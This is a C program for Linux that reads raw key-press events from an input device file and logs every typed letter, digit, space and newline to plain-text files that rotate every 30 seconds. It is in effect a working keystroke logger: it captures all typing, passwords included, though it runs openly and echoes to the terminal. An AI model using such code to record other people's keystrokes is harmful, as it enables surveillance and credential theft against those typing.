#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <time.h>
#include <string.h>
#include <sys/stat.h>

// Direct mapping of common keycodes to their printable ASCII character
const char key_to_char[KEY_MAX] = {
    [KEY_SPACE] = ' ',
    [KEY_ENTER] = '\n',
    [KEY_A] = 'a', [KEY_B] = 'b', [KEY_C] = 'c', [KEY_D] = 'd', [KEY_E] = 'e',
    [KEY_F] = 'f', [KEY_G] = 'g', [KEY_H] = 'h', [KEY_I] = 'i', [KEY_J] = 'j',
    [KEY_K] = 'k', [KEY_L] = 'l', [KEY_M] = 'm', [KEY_N] = 'n', [KEY_O] = 'o',
    [KEY_P] = 'p', [KEY_Q] = 'q', [KEY_R] = 'r', [KEY_S] = 's', [KEY_T] = 't',
    [KEY_U] = 'u', [KEY_V] = 'v', [KEY_W] = 'w', [KEY_X] = 'x', [KEY_Y] = 'y',
    [KEY_Z] = 'z',

    [KEY_1] = '1', [KEY_2] = '2', [KEY_3] = '3', [KEY_4] = '4', [KEY_5] = '5',
    [KEY_6] = '6', [KEY_7] = '7', [KEY_8] = '8', [KEY_9] = '9', [KEY_0] = '0'
};

// Helper function to print the current human-readable time
void print_timestamp()
{
    time_t raw_time;
    struct tm *time_info;
    char buffer[80];

    time(&raw_time);
    time_info = localtime(&raw_time);

    strftime(buffer, sizeof(buffer),
             "\n[%Y-%m-%d %H:%M:%S]\n",
             time_info);

    printf("%s", buffer);
    fflush(stdout);
}

// Create a new log file based on current date/time
FILE *create_new_log()
{
    time_t raw_time;
    struct tm *time_info;
    char filename[256];

    time(&raw_time);
    time_info = localtime(&raw_time);

    strftime(filename, sizeof(filename),
             "keyboard_%Y-%m-%d_%H-%M-%S.txt",
             time_info);

    FILE *log_file = fopen(filename, "a");

    if (log_file == NULL) {
        perror("Error creating log file");
        return NULL;
    }

    printf("\n[New log file: %s]\n", filename);
    fflush(stdout);

    fprintf(log_file,
            "\n========== Log started: %s ==========\n",
            filename);

    fflush(log_file);

    return log_file;
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <event-file-path>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int fd = open(argv[1], O_RDONLY);

    if (fd < 0)
    {
        perror("Error opening event file");
        exit(EXIT_FAILURE);
    }

    printf("Listening to keyboard... Start typing:\n");
    print_timestamp();

    /*
     * Create the first log file.
     */
    FILE *log_file = create_new_log();

    if (log_file == NULL)
    {
        close(fd);
        exit(EXIT_FAILURE);
    }

    /*
     * Log rotation interval.
     */
    time_t last_log_rotation = time(NULL);
    const int log_rotation_seconds = 30;

    /*
     * Timestamp printing interval.
     */
    time_t last_timestamp_time = time(NULL);
    const int five_minutes_in_seconds = 300;

    /*
     * Debounce variables.
     */
    int last_keycode = -1;
    long last_key_sec = 0;
    long last_key_usec = 0;
    const long debounce_ms = 50;

    struct input_event ie;

    while (read(fd, &ie, sizeof(ie)) == sizeof(ie))
    {
        /*
         * Rotate log every 30 seconds.
         */
        time_t current_time = time(NULL);

        if (current_time - last_log_rotation >= log_rotation_seconds)
        {
            fclose(log_file);

            log_file = create_new_log();

            if (log_file == NULL)
            {
                close(fd);
                exit(EXIT_FAILURE);
            }

            last_log_rotation = current_time;
        }

        /*
         * Only process hardware key-down events.
         *
         * value == 1 : key press
         * value == 2 : autorepeat
         * value == 0 : key release
         */
        if (ie.type == EV_KEY && ie.value == 1)
        {
            if (ie.code < KEY_MAX)
            {
                char typed_char = key_to_char[ie.code];

                if (typed_char != 0)
                {
                    /*
                     * Debounce check.
                     */
                    if (ie.code == last_keycode)
                    {
                        long elapsed_ms =
                            (ie.time.tv_sec - last_key_sec) * 1000 +
                            (ie.time.tv_usec - last_key_usec) / 1000;

                        if (elapsed_ms < debounce_ms)
                        {
                            continue;
                        }
                    }

                    /*
                     * Update debounce anchor.
                     */
                    last_keycode = ie.code;
                    last_key_sec = ie.time.tv_sec;
                    last_key_usec = ie.time.tv_usec;

                    /*
                     * Check five-minute timestamp.
                     */
                    current_time = time(NULL);

                    if (current_time - last_timestamp_time >=
                        five_minutes_in_seconds)
                    {
                        print_timestamp();
                        last_timestamp_time = current_time;
                    }

                    /*
                     * Write character to current log file.
                     */
                    fprintf(log_file, "%c", typed_char);
                    fflush(log_file);

                    /*
                     * Also display on terminal.
                     */
                    printf("%c", typed_char);
                    fflush(stdout);
                }
            }
        }
    }

    fclose(log_file);
    close(fd);

    return 0;
}
